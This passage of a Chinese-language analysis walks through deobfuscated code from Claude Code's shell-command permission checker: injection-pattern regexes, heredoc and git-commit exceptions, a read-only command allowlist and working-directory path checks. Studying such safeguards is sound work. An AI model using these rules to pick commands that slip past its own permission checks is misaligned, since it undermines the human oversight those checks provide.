H),\n    decisionReason: H,\n    suggestions: K\n  };\n}\n```\n\n---\n\n## 四、命令注入检测详解\n### 4.1 主检测函数 `Rx()` - 命令注入检测核心\n**代码位置**: `deobfuscated.js:392010`\n\n```javascript\nfunction Rx(A) {\n  // A: 要检测的命令字符串\n\n  // 步骤 1: 提取基础命令名\n  let B = A.split(\" \")[0] || \"\";\n\n  // 步骤 2: 解析命令，分离引用和非引用内容\n  let {\n    withDoubleQuotes: Q,      // 保留双引号的内容\n    fullyUnquoted: Z          // 完全移除引号的内容\n  } = VL6(A, B === \"jq\");     // jq 命令特殊处理\n\n  // 构造检测上下文\n  let G = {\n    originalCommand: A,\n    baseCommand: B,\n    unquotedContent: Q,\n    fullyUnquotedContent: KL6(Z)  // 清理重定向符\n  };\n\n  // 步骤 3: 第一阶段 - 允许性检查\n  // 这些函数如果返回 allow，表示命令是安全的\n  let Y = [HL6, DL6, CL6, UL6, EL6];\n  for (let W of Y) {\n    let J = W(G);\n    if (J.behavior === \"allow\") {\n      return {\n        behavior: \"passthrough\",\n        message: J.decisionReason?.type === \"other\"\n          ? J.decisionReason.reason\n          : \"Command allowed\"\n      };\n    }\n    if (J.behavior !== \"passthrough\") {\n      return J;  // 发现问题，直接返回\n    }\n  }\n\n  // 步骤 4: 第二阶段 - 安全性检查\n  // 这些函数如果返回 ask，表示命令有风险\n  let I = [$L6, ML6, wL6, qL6, LL6, NL6];\n  for (let W of I) {\n    let J = W(G);\n    if (J.behavior === \"ask\") {\n      return J;  // 发现风险，返回\n    }\n  }\n\n  // 所有检查通过\n  return {\n    behavior: \"passthrough\",\n    message: \"Command passed all security checks\"\n  };\n}\n```\n\n---\n\n### 4.2 危险模式列表 `FL6`\n**代码位置**: `deobfuscated.js:391557`\n\n```javascript\nvar FL6 = [\n  {\n    pattern: /<\\(/,\n    message: \"process substitution <()\"  // 进程替换\n  },\n  {\n    pattern: />\\(/,\n    message: \"process substitution >()\"  // 进程替换\n  },\n  {\n    pattern: /`/,\n    message: \"backticks (`) for command substitution\"  // 反引号命令替换\n  },\n  {\n    pattern: /\\$\\(/,\n    message: \"$() command substitution\"  // $() 命令替换\n  },\n  {\n    pattern: /\\$\\{/,\n    message: \"${} parameter substitution\"  // ${} 参数替换\n  },\n  {\n    pattern: /~\\[/,\n    message: \"Zsh-style parameter expansion\"  // Zsh 风格参数展开\n  },\n  {\n    pattern: /\\(e:/,\n    message: \"Zsh-style glob qualifiers\"  // Zsh 风格通配符限定符\n  }\n];\n```\n\n---\n\n### 4.3 空命令检测 `HL6()`\n**代码位置**: `deobfuscated.js:391632`\n\n```javascript\nfunction HL6(A) {\n  // A: 检测上下文 { originalCommand, baseCommand, ... }\n\n  if (!A.originalCommand.trim()) {\n    return {\n      behavior: \"allow\",\n      updatedInput: { command: A.originalCommand },\n      decisionReason: {\n        type: \"other\",\n        reason: \"Empty command is safe\"\n      }\n    };\n  }\n  return {\n    behavior: \"passthrough\",\n    message: \"Command is not empty\"\n  };\n}\n```\n\n---\n\n### 4.4 命令完整性检测 `DL6()`\n**代码位置**: `deobfuscated.js:391650`\n\n```javascript\nfunction DL6(A) {\n  let { originalCommand: B } = A;\n  let Q = B.trim();\n\n  // 检测 1: 命令以制表符开头（不完整的片段）\n  if (/^\\s*\\t/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command appears to be an incomplete fragment (starts with tab)\"\n    };\n  }\n\n  // 检测 2: 命令以 - 开头（可能是不完整的标志）\n  if (Q.startsWith(\"-\")) {\n    return {\n      behavior: \"ask\",\n      message: \"Command appears to be an incomplete fragment (starts with flags)\"\n    };\n  }\n\n  // 检测 3: 命令以 shell 操作符开头（延续行）\n  if (/^\\s*(&&|\\|\\||;|>>?|<)/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command appears to be a continuation line (starts with operator)\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"Command appears complete\"\n  };\n}\n```\n\n---\n\n### 4.5 Heredoc 检测 `CL6()` 和 `zL6()`\n**代码位置**: `deobfuscated.js:391678, 391731`\n\n```javascript\n// 检测 heredoc 是否安全\nfunction zL6(A) {\n  // A: 命令字符串\n\n  // 检查是否包含命令替换中的 heredoc\n  if (!vK0.test(A)) {  // vK0 = /\\$\\(.*<</\n    return false;\n  }\n\n  // 提取所有 heredoc 定界符\n  let B = /\\$\\(cat\\s*<<-?\\s*(?:'+([A-Za-z_]\\w*)'+|\\\\([A-Za-z_]\\w*))\\s*\\n/g;\n  let Q;\n  let Z = [];\n\n  while ((Q = B.exec(A)) !== null) {\n    let Y = Q[1] || Q[2];  // 提取定界符名称\n    if (Y) {\n      Z.push({\n        start: Q.index,\n        delimiter: Y\n      });\n    }\n  }\n\n  if (Z.length === 0) {\n    return false;\n  }\n\n  // 验证每个 heredoc 是否正确闭合\n  for (let { start: Y, delimiter: I } of Z) {\n    let W = A.substring(Y);\n    let J = I.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\");  // 转义正则字符\n\n    // 检查定界符是否闭合\n    if (!new RegExp(`\\n${I}\\\\s*\\)`).test(W)) {\n      return false;\n    }\n\n    // 检查完整的 heredoc 结构\n    let F = new RegExp(`^\\\\$\\\\(cat\\\\s*<<-?\\\\s*(?:'+${J}'+|\\\\\\\\${J})\\\\s*\\\\n(?:[\\\\s\\\\S]*?\\\\n)?${I}\\\\s*\\\\)`);\n    if (!W.match(F)) {\n      return false;\n    }\n  }\n\n  // 移除所有安全的 heredoc\n  let G = A;\n  for (let { delimiter: Y } of Z) {\n    let I = Y.replace(/[.*+?^${}()|[\\]\\\\]/g, \"\\\\$&\");\n    let W = new RegExp(`\\\\$\\\\(cat\\\\s*<<-?\\\\s*(?:'+${I}'+|\\\\\\\\${I})\\\\s*\\\\n(?:[\\\\s\\\\S]*?\\\\n)?${I}\\\\s*\\\\)`);\n    G = G.replace(W, \"\");\n  }\n\n  // 检查是否还有其他危险的命令替换\n  if (/\\$\\(/.test(G)) {\n    return false;\n  }\n  if (/`/.test(G)) {\n    return false;\n  }\n  if (/\\${/.test(G)) {\n    return false;\n  }\n\n  return true;\n}\n\n// Heredoc 主检测函数\nfunction CL6(A) {\n  let { originalCommand: B } = A;\n\n  // 如果没有 heredoc，通过\n  if (!vK0.test(B)) {\n    return {\n      behavior: \"passthrough\",\n      message: \"No heredoc in substitution\"\n    };\n  }\n\n  // 如果 heredoc 安全，允许\n  if (zL6(B)) {\n    return {\n      behavior: \"allow\",\n      updatedInput: { command: B },\n      decisionReason: {\n        type: \"other\",\n        reason: \"Safe command substitution: cat with quoted/escaped heredoc delimiter\"\n      }\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"Command substitution needs validation\"\n  };\n}\n```\n\n---\n\n### 4.6 Git Commit 检测 `UL6()`\n**代码位置**: `deobfuscated.js:391758`\n\n```javascript\nfunction UL6(A) {\n  let { originalCommand: B, baseCommand: Q } = A;\n\n  // 只检查 git commit 命令\n  if (Q !== \"git\" || !/^git\\s+commit\\s+/.test(B)) {\n    return {\n      behavior: \"passthrough\",\n      message: \"Not a git commit\"\n    };\n  }\n\n  // 检查 git commit -m \"message\" 格式\n  let Z = B.match(/^git\\s+commit\\s+.*-m\\s+([\"'])([\\s\\S]*?)\\1(.*)$/);\n  if (Z) {\n    let [, G, Y, I] = Z;\n    // G: 引号类型 (' 或 \")\n    // Y: commit 消息内容\n    // I: 后续参数\n\n    // 双引号消息中检测命令替换\n    if (G === \"\\\"\" && Y && /\\$\\(|`|\\$\\{/.test(Y)) {\n      return {\n        behavior: \"ask\",\n        message: \"Git commit message contains command substitution patterns\"\n      };\n    }\n\n    // 检查后续参数中的命令替换\n    if (I && /\\$\\(|`|\\$\\{/.test(I)) {\n      return {\n        behavior: \"passthrough\",\n        message: \"Check patterns in flags\"\n      };\n    }\n\n    // 简单的 git commit 是安全的\n    return {\n      behavior: \"allow\",\n      updatedInput: { command: B },\n      decisionReason: {\n        type: \"other\",\n        reason: \"Git commit with simple quoted message is allowed\"\n      }\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"Git commit needs validation\"\n  };\n}\n```\n\n---\n\n### 4.7 安全 Heredoc 检测 `EL6()`\n**代码位置**: `deobfuscated.js:391800`\n\n```javascript\nfunction EL6(A) {\n  let { originalCommand: B } = A;\n\n  // 如果包含命令替换中的 heredoc，跳过（由 CL6 处理）\n  if (vK0.test(B)) {\n    return {\n      behavior: \"passthrough\",\n      message: \"Heredoc in substitution\"\n    };\n  }\n\n  // 检测安全的 heredoc 模式\n  let Q = /<<-?\\s*'[^']+'/;  // 单引号定界符\n  let Z = /<<-?\\s*\\\\\\w+/;      // 转义定界符\n\n  if (Q.test(B) || Z.test(B)) {\n    return {\n      behavior: \"allow\",\n      updatedInput: { command: B },\n      decisionReason: {\n        type: \"other\",\n        reason: \"Heredoc with quoted/escaped delimiter is safe\"\n      }\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No heredoc patterns\"\n  };\n}\n```\n\n---\n\n### 4.8 jq 命令检测 `$L6()`\n**代码位置**: `deobfuscated.js:391829`\n\n```javascript\nfunction $L6(A) {\n  let { originalCommand: B, baseCommand: Q } = A;\n\n  // 只检查 jq 命令\n  if (Q !== \"jq\") {\n    return {\n      behavior: \"passthrough\",\n      message: \"Not jq\"\n    };\n  }\n\n  // 检测 system() 函数（可执行任意命令）\n  if (/\\bsystem\\s*\\(/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"jq command contains system() function which executes arbitrary commands\"\n    };\n  }\n\n  // 检测文件参数（只读模式不应读取文件）\n  let Z = B.substring(3).trim();\n  if (/(?:^|\\s)(?:[^'\"\\s-][^\\s]*\\s+)?(?:\\/|~|\\w+\\.\\w+)/.test(Z) && !/^\\.[^\\s]+$/.test(Z)) {\n    return {\n      behavior: \"ask\",\n      message: \"jq command contains file arguments - jq should only read from stdin in read-only mode\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"jq command is safe\"\n  };\n}\n```\n\n---\n\n### 4.9 Find 命令元字符检测 `wL6()`\n**代码位置**: `deobfuscated.js:391858`\n\n```javascript\nfunction wL6(A) {\n  let { unquotedContent: B } = A;\n  let Q = \"Command contains shell metacharacters (;, |, or &) in arguments\";\n\n  // 检测 1: 引号内的 shell 元字符\n  if (/(?:^|\\s)[\"'][^\"']*[;&][^\"']*[\"'](?:\\s|$)/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains shell metacharacters (;, |, or &) in arguments\"\n    };\n  }\n\n  // 检测 2: find 命令特定参数中的元字符\n  if ([\n    /-name\\s+[\"'][^\"']*[;|&][^\"']*[\"']/,\n    /-path\\s+[\"'][^\"']*[;|&][^\"']*[\"']/,\n    /-iname\\s+[\"'][^\"']*[;|&][^\"']*[\"']/\n  ].some(G => G.test(B))) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains shell metacharacters (;, |, or &) in arguments\"\n    };\n  }\n\n  // 检测 3: -regex 参数中的元字符\n  if (/-regex\\s+[\"'][^\"']*[;&][^\"']*[\"']/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains shell metacharacters (;, |, or &) in arguments\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No metacharacters\"\n  };\n}\n```\n\n---\n\n### 4.10 危险变量检测 `qL6()`\n**代码位置**: `deobfuscated.js:391886`\n\n```javascript\nfunction qL6(A) {\n  let { fullyUnquotedContent: B } = A;\n\n  // 检测重定向或管道中的变量\n  // 模式 1: < 或 > 后跟 $VAR\n  // 模式 2: $VAR 后跟 |, <, >\n  if (/[<>|]\\s*\\$[A-Za-z_]/.test(B) ||\n      /\\$[A-Za-z_][A-Za-z0-9_]*\\s*[|<>]/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains variables in dangerous contexts (redirections or pipes)\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No dangerous variables\"\n  };\n}\n```\n\n---\n\n### 4.11 危险模式检测 `NL6()`\n**代码位置**: `deobfuscated.js:391901`\n\n```javascript\nfunction NL6(A) {\n  let { unquotedContent: B, fullyUnquotedContent: Q } = A;\n\n  // 检查危险模式列表中的每个模式\n  for (let { pattern: Z, message: G } of FL6) {\n    if (Z.test(B)) {\n      return {\n        behavior: \"ask\",\n        message: `Command contains ${G}`\n      };\n    }\n  }\n\n  // 检测输入重定向（可能读取敏感文件）\n  if (</.test(Q)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains input redirection (<) which could read sensitive files\"\n    };\n  }\n\n  // 检测输出重定向（可能写入任意文件）\n  if (/>/.test(Q)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains output redirection (>) which could write to arbitrary files\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No dangerous patterns\"\n  };\n}\n```\n\n---\n\n### 4.12 换行符检测 `LL6()`\n**代码位置**: `deobfuscated.js:391934`\n\n```javascript\nfunction LL6(A) {\n  let { fullyUnquotedContent: B } = A;\n\n  // 如果没有换行符，通过\n  if (!/[\\n\\r]/.test(B)) {\n    return {\n      behavior: \"passthrough\",\n      message: \"No newlines\"\n    };\n  }\n\n  // 检测可能分隔多个命令的换行符\n  // 换行符后跟字母、/、. 或 ~ 可能是命令分隔\n  if (/[\\n\\r]\\s*[a-zA-Z/.~]/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains newlines that could separate multiple commands\"\n    };\n  }\n\n  // 换行符可能在数据中\n  return {\n    behavior: \"passthrough\",\n    message: \"Newlines appear to be within data\"\n  };\n}\n```\n\n---\n\n### 4.13 混淆标志检测 `ML6()`\n**代码位置**: `deobfuscated.js:391955`\n\n```javascript\nfunction ML6(A) {\n  let { originalCommand: B, baseCommand: Q } = A;\n\n  // echo 命令是安全的\n  if (Q === \"echo\") {\n    return {\n      behavior: \"passthrough\",\n      message: \"echo command is safe and has no dangerous flags\"\n    };\n  }\n\n  // 检测混淆的标志名称\n  for (let Z = 0; Z < B.length - 1; Z++) {\n    let G = B[Z];\n    let Y = B[Z + 1];\n\n    // 检测 \"空格 -\" 模式（可能用于绕过检测）\n    if (G && Y && /\\s/.test(G) && Y === \"-\") {\n      let I = Z + 1;\n\n      // 查找标志的结束位置\n      while (I < B.length && B[I] && !B[I].includes(\" \")) {\n        I++;\n      }\n\n      let W = B.substring(Z + 2, I);\n      if (W.includes(\"\\\"\") || W.includes(\"'\")) {\n        return {\n          behavior: \"ask\",\n          message: \"Command contains quoted characters in flag names\"\n        };\n      }\n    }\n  }\n\n  // 检测引号后的 - 标志\n  if (/\\s['\"`]-/.test(B)) {\n    return {\n      behavior: \"ask\",\n      message: \"Command contains quoted characters in flag names\"\n    };\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"No obfuscated flags detected\"\n  };\n}\n```\n\n---\n\n## 五、安全命令白名单\n### 5.1 白名单检测函数 `Hj6()`\n**代码位置**: `deobfuscated.js:396887`\n\n```javascript\nfunction Hj6(A) {\n  // A: 命令字符串\n\n  let B = A.trim();\n\n  // 移除标准的 stderr 重定向\n  if (B.endsWith(\" 2>&1\")) {\n    B = B.slice(0, -5).trim();\n  }\n\n  // 检查命令是否匹配白名单中的任何正则表达式\n  for (let Q of Vj6) {\n    if (Q.test(B)) {\n      // 特殊处理: git -c 被排除（可能执行任意命令）\n      if (B.includes(\"git\") && /\\s-c[\\s=]/.test(B)) {\n        return false;\n      }\n      return true;  // 命令在白名单中\n    }\n  }\n\n  return false;  // 命令不在白名单中\n}\n```\n\n---\n\n### 5.2 白名单正则表达式列表\n**代码位置**: `deobfuscated.js:396869-396870`\n\n```javascript\n// 基础安全命令列表\nvar Fj6 = [\n  \"date\", \"cal\", \"uptime\",\n  \"head\", \"tail\", \"wc\", \"stat\",\n  \"strings\", \"hexdump\", \"nl\",\n  \"id\", \"uname\", \"free\", \"df\", \"du\",\n  \"locale\", \"hostname\", \"arch\", \"groups\", \"nproc\",\n  \"npm list\", \"docker ps\", \"docker images\",\n  \"ip addr\", \"ifconfig\",\n  \"info\", \"help\",\n  \"basename\", \"dirname\", \"realpath\",\n  \"base64\", \"cut\", \"tr\", \"column\", \"diff\",\n  \"true\", \"false\", \"sleep\",\n  \"which\", \"type\",\n  \"grep\", \"rg\"\n];\n\n// 完整白名单正则表达式集合\nvar Vj6 = new Set([\n  // 为基础命令生成正则\n  ...Fj6.map(Xj6),  // Xj6 生成 /^cmdname(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/ 模式\n\n  // Echo 命令（受限模式）\n  /^echo(?:\\s+(?:'[^']*'|\"[^\"$<>\\n\\r]*\"|[^|;&`$(){}><#\\\\!\"'\\s]+))*(?:\\s+2>&1)?\\s*$/,\n\n  // Claude 帮助\n  /^claude -h$/,\n  /^claude --help$/,\n\n  // Git 只读命令（严格限制危险标志）\n  /^git diff(?:\\s|$)(?!.*--ext-diff)(?!.*--extcmd)(?!.*--output)(?!.*--textconv)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git log(?:\\s|$)(?!.*--output)(?!.*--pretty)(?!.*--format)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git show(?:\\s|$)(?!.*--ext-diff)(?!.*--extcmd)(?!.*--output)(?!.*--textconv)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git status(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git blame(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git reflog(?:\\s|$)(?!.*--updateref)(?!.*--rewrite)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git stash list(?:\\s|$)(?!.*--output)(?!.*--pretty)(?!.*--format)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git ls-files(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git ls-remote(?!\\s+.*--upload-pack)(?:\\s+[a-zA-Z0-9_-]+(?:\\s+[^<>()$`|{}&;\\n\\r]+)?)?$/,\n  /^git config --get[^<>()$`|{}&;\\n\\r]*$/,\n  /^git remote -v$/,\n  /^git remote show(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^git tag$/,\n  /^git tag -l[^<>()$`|{}&;\\n\\r]*$/,\n\n  // Git 分支命令（受限）\n  /^git branch$/,\n  /^git branch (?:-v|-vv|--verbose)$/,\n  /^git branch (?:-a|--all)$/,\n  /^git branch (?:-r|--remotes)$/,\n  /^git branch (?:-l|--list)(?:\\s+\".*\"|'[^']*')?$/,\n  /^git branch (?:--color|--no-color|--column|--no-column)$/,\n  /^git branch --sort=\\S+$/,\n  /^git branch --show-current$/,\n  /^git branch (?:--contains|--no-contains)\\s+\\S+$/,\n  /^git branch (?:--merged|--no-merged)(?:\\s+\\S+)?$/,\n\n  // 包管理器\n  /^pip list(?:\\s|$)(?!.*--log)[^<>()$`|{}&;\\n\\r]*$/,\n\n  // 文件操作（受限）\n  /^file(?:\\s|$)(?!.*-C)(?!.*--compile)[^<>()$`|{}&;\\n\\r]*$/,\n\n  // 文本处理工具（受限）\n  /^sort(?!\\s+.*-o\\b)(?!\\s+.*--output)(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^uniq(?:\\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\\S+)?|-[fsw]\\s+\\d+))*(?:\\s|$)\\s*$/,\n  /^sed(?!\\s*-[^-\\s]*i)(?!\\s*--in-place)(?!\\s*-[^-\\s]*f)(?!\\s*--file)(?!\\s*--expression-file)(?:\\s+(?:-[nzEr]+|-e\\s+(?:'[^']*'|\"[^\"]*\")))*(?:\\s+(?:'[^']*'|\"[^\"]*\"))?(?:\\s+(?:-[nzEr]+|-e\\s+(?:'[^']*'|\"[^\"]*\")))*\\s*$/,\n\n  // 系统信息\n  /^pwd$/,\n  /^whoami$/,\n  /^ps(?:\\s|$)(?!.*-o)[^<>()$`|{}&;\\n\\r]*$/,\n\n  // 版本查询\n  /^node -v$/,\n  /^npm -v$/,\n  /^python --version$/,\n  /^python3 --version$/,\n\n  // 网络工具\n  /^netstat(?!\\s+.*-p)(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n\n  // 手册和其他\n  /^man(?!\\s+.*-P)(?!\\s+.*--pager)(?!\\s+.*-H)\\b(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^tree$/,\n  /^history(?!\\s+.*-c)(?:\\s|$)[^<>()$`|{}&;\\n\\r]*$/,\n  /^alias$/,\n\n  // jq（受限）\n  /^jq(?!\\s+.*(?:-f\\b|--from-file|--rawfile|--slurpfile|--run-tests))(?:\\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\\S+)?))*(?: +(?:'[^'`]*'|\"[^\"`]*\"|[^-\\s][^\\s]*))?\\s*$/,\n\n  // xargs（受限）\n  /^xargs(?:\\s+(?:-[a-zA-Z0-9]+(?:\\s+[^\\s-][^\\s]*)?|--[a-zA-Z-]+(?:=\\S+)?))*?\\s+(?:echo|printf|wc|grep|head|tail)(?:\\s+[^<>()$`|&;\\n\\r]*)?$/,\n\n  // 目录操作\n  /^cd(?:\\s+(?:'[^']*'|\"[^\"]*\"|[^\\s;|&`$(){}><#\\\\]+))?$/,\n  /^ls(?:\\s+[^<>()$`|{}&;\\n\\r]*)?$/,\n  /^find(?:\\s+(?:(?!-delete\\b|-exec\\b|-execdir\\b|-ok\\b|-okdir\\b|-fprint0?\\b|-fls\\b|-fprintf\\b)[^<>()$`|{}&;\\n\\r\\s]|\\\\[()]|\\s)+)?$/\n]);\n```\n\n---\n\n## 六、路径受限命令验证\n### 6.1 路径验证主函数 `cS6()`\n**代码位置**: `deobfuscated.js:396290`\n\n```javascript\nfunction cS6(A, B, Q, Z) {\n  // A: 命令名称 (cd, ls, find, ...)\n  // B: 命令参数数组\n  // Q: 当前工作目录\n  // Z: 权限上下文\n\n  // 步骤 1: 根据命令类型提取路径\n  let G = ne2[A];  // 获取路径提取函数\n  let Y = G(B);    // 提取路径列表\n\n  // 步骤 2: 验证每个路径\n  for (let I of Y) {\n    let {\n      allowed: W,\n      resolvedPath: J\n    } = gS6(I, Q, Z);  // 解析并验证路径\n\n    if (!W) {\n      // 路径不被允许\n      let X = Array.from(nQ1(Z));  // 获取允许的目录列表\n      let F = vS6(X);               // 格式化目录列表\n      return {\n        valid: false,\n        message: `${A} in '${J}' was blocked. For security, Claude Code may only ${mS6[A]} the allowed working directories for this session: ${F}.`,\n        blockedPath: J\n      };\n    }\n  }\n\n  return { valid: true };\n}\n```\n\n---\n\n### 6.2 路径提取函数集合 `ne2`\n**代码位置**: `deobfuscated.js:396145`\n\n```javascript\nvar ne2 = {\n  // cd: 无参数则使用 home 目录，否则返回参数\n  cd: A => A.length === 0 ? [le2()] : [A.join(\" \")],  // le2() = homedir()\n\n  // ls: 过滤标志，无路径则使用 \".\"\n  ls: A => {\n    let B = y3(A);  // y3 = 过滤以 - 开头的参数\n    if (B.length > 0) {\n      return B;\n    } else {\n      return [\".\"];\n    }\n  },\n\n  // find: 复杂的路径提取逻辑\n  find: A => {\n    let B = [];\n    let Q = new Set([\n      \"-newer\", \"-anewer\", \"-cnewer\", \"-mnewer\", \"-samefile\",\n      \"-path\", \"-wholename\", \"-ilname\", \"-lname\", \"-ipath\", \"-iwholename\"\n    ]);\n    let Z = /^-newer[acmBt][acmtB]$/;\n    let G = false;\n\n    for (let Y = 0; Y < A.length; Y++) {\n      let I = A[Y];\n      if (!I) {\n        continue;\n      }\n\n      // 处理标志\n      if (I.startsWith(\"-\")) {\n        if ([\"-H\", \"-L\", \"-P\"].includes(I)) {\n          continue;\n        }\n        G = true;\n        // 如果标志接受路径参数，提取下一个参数\n        if (Q.has(I) || Z.test(I)) {\n          let W = A[Y + 1];\n          if (W) {\n            B.push(W);\n            Y++;\n          }\n        }\n        continue;\n      }\n\n      // 第一个非标志参数是路径\n      if (!G) {\n        B.push(I);\n      }\n    }\n\n    if (B.length > 0) {\n      return B;\n    } else {\n      return [\".\"];\n    }\n  },\n\n  // 大多数命令: 过滤标志参数\n  mkdir: y3,  // y3 = A => A.filter(B => !B?.startsWith(\"-\"))\n  touch: y3,\n  rm: y3,\n  rmdir: y3,\n  mv: y3,\n  cp: y3,\n  cat: y3,\n  head: y3,\n  tail: y3,\n  sort: y3,\n  uniq: y3,\n  wc: y3,\n  cut: y3,\n  paste: y3,\n  column: y3,\n  file: y3,\n  stat: y3,\n  diff: y3,\n  awk: y3,\n  strings: y3,\n  hexdump: y3,\n  base64: y3,\n  nl: y3,\n\n  // tr: 特殊处理（删除第一个或前两个参数）\n  tr: A => {\n    let B = A.some(Z => Z === \"-d\" || Z === \"--delete\" || Z.startsWith(\"-\") && Z.includes(\"d\"));\n    return y3(A).slice(B ? 1 : 2);\n  },\n\n  // grep: 提取模式参数\n  grep: A => {\n    let Q = ce2(A, new Set([\n      \"-e\", \"--regexp\", \"-f\", \"--file\",\n      \"--exclude\", \"--include\", \"--exclude-dir\", \"--include-dir\",\n      \"-m\", \"--max-count\"\n    ]));\n    if (Q.length === 0 && A.some(Z => [\"-r\", \"-R\", \"--recursive\"].includes(Z))) {\n      return [\".\"];  // 递归搜索默认使用当前目录\n    }\n    return Q;\n  },\n\n  // rg (ripgrep): 提取模式参数\n  rg: A => {\n    return ce2(A, new Set([\n      \"-e\", \"--regexp\", \"-f\", \"--file\",\n      \"-t\", \"--type\", \"-T\", \"--type-not\",\n      \"-g\", \"--glob\",\n      \"-m\", \"--max-count\", \"--max-depth\",\n      \"-r\", \"--replace\"\n    ]), [\".\"]);\n  }\n};\n\n// 受限命令列表\nvar uS6 = Object.keys(ne2);\n// = [\"cd\", \"ls\", \"find\", \"mkdir\", \"touch\", \"rm\", \"rmdir\", \"mv\", \"cp\",\n//     \"cat\", \"head\", \"tail\", \"sort\", \"uniq\", \"wc\", \"cut\", \"paste\", \"column\",\n//     \"file\", \"stat\", \"diff\", \"awk\", \"strings\", \"hexdump\", \"base64\", \"nl\",\n//     \"tr\", \"grep\", \"rg\"]\n```\n\n---\n\n### 6.3 路径解析函数 `gS6()`\n**代码位置**: `deobfuscated.js:396100`\n\n```javascript\nfunction gS6(A, B, Q) {\n  // A: 路径字符串\n  // B: 当前工作目录\n  // Q: 权限上下文\n\n  // 步骤 1: 移除外层引号并展开 ~\n  let Z = hS6(A.replace(/^['\"]|['\"]$/g, \"\"));\n\n  // 步骤 2: 如果包含通配符，特殊处理\n  if (ie2.test(Z)) {  // ie2 = /[*?[\\]{}]/\n    return fS6(Z, B, Q);  // 处理通配符\n  }\n\n  // 步骤 3: 解析为绝对路径\n  let G = vH0(Z) ? Z : bH0(B, Z);\n  let { resolvedPath: Y } = EK(O1(), G);\n\n  // 步骤 4: 检查路径是否在允许的目录中\n  return {\n    allowed: ZD(Y, Q),  // ZD = 检查路径是否允许\n    resolvedPath: Y\n  };\n}\n```\n\n---\n\n### 6.4 路径受限命令包装器 `iS6()` 和 `lS6()`\n**代码位置**: `deobfuscated.js:396312, 396343`\n\n```javascript\n// 路径验证包装器工厂\nfunction lS6(A) {\n  // A: 命令名称\n  return (B, Q, Z) => {\n    // B: 命令参数\n    // Q: 当前工作目录\n    // Z: 权限上下文\n\n    let G = cS6(A, B, Q, Z);\n    if (G.valid) {\n      return {\n        behavior: \"passthrough\",\n        message: `Path validation passed for ${A} command`\n      };\n    }\n\n    let Y = dS6[A];  // 获取操作类型 (read/write/create)\n    let I = G.blockedPath ? hi(G.blockedPath, Y, Z) : undefined;\n    return {\n      behavior: \"ask\",\n      message: G.message,\n      blockedPath: G.blockedPath,\n      suggestions: I\n    };\n  };\n}\n\n// 路径提取和验证\nfunction pS6(A) {\n  // A: 命令字符串\n  let B = pe2.parse(A, Z => `$${Z}`);  // 使用 shell-parser 解析\n  let Q = [];\n\n  for (let Z of B) {\n    if (typeof Z === \"string\") {\n      Q.push(Z);\n    } else if (typeof Z === \"object\" && Z !== null && \"op\" in Z && Z.op === \"glob\" && \"pattern\" in Z) {\n      Q.push(String(Z.pattern));\n    }\n  }\n\n  return Q;\n}\n\nfunction iS6(A, B, Q) {\n  // A: 命令字符串\n  // B: 当前工作目录\n  // Q: 权限上下文\n\n  let Z = pS6(A);  // 提取路径\n\n  if (Z.length === 0) {\n    return {\n      behavior: \"passthrough\",\n      message: \"Empty command - no paths to validate\"\n    };\n  }\n\n  let [G, ...Y] = Z;\n\n  // 检查是否为路径受限命令\n  if (!G || !uS6.includes(G)) {\n    return {\n      behavior: \"passthrough\",\n      message: `Command '${G}' is not a path-restricted command`\n    };\n  }\n\n  // 执行路径验证\n  return lS6(G)(Y, B, Q);\n}\n```\n\n---\n\n### 6.5 路径验证调用 `ae2()`\n**代码位置**: `deobfuscated.js:396360`\n\n```javascript\nfunction ae2(A, B, Q) {\n  // A: 命令对象\n  // B: 当前工作目录\n  // Q: 权限上下文\n\n  // 分割命令为多个子命令\n  let Z = PU(A.command);\n\n  // 验证每个子命令的路径\n  for (let G of Z) {\n    let Y = iS6(G, B, Q);\n    if (Y.behavior === \"ask\" || Y.behavior === \"deny\") {\n      return Y;\n    }\n  }\n\n  return {\n    behavior: \"passthrough\",\n    message: \"All path commands validated successfully\"\n  };\n}\n```\n\n---\n\n### 6.6 模式特定行为验证 `se2()`\n**代码位置**: `deobfuscated.js:396403`\n\n```javascript\nfunction se2(A, B) {\n  // A: 命令对象\n  // B: 权限上下文\n\n  // bypassPermissions 模式在主流程中处理\n  if (B.mode === \"bypassPermissions\") {\n    return {\n      behavior: \"passthrough\",\n      message: \"Bypass mode is handled in main permission flow\"\n    };\n  }\n\n  // 分割命令并检查每个子命令的模式特定行为\n  let Q = PU(A.command);\n  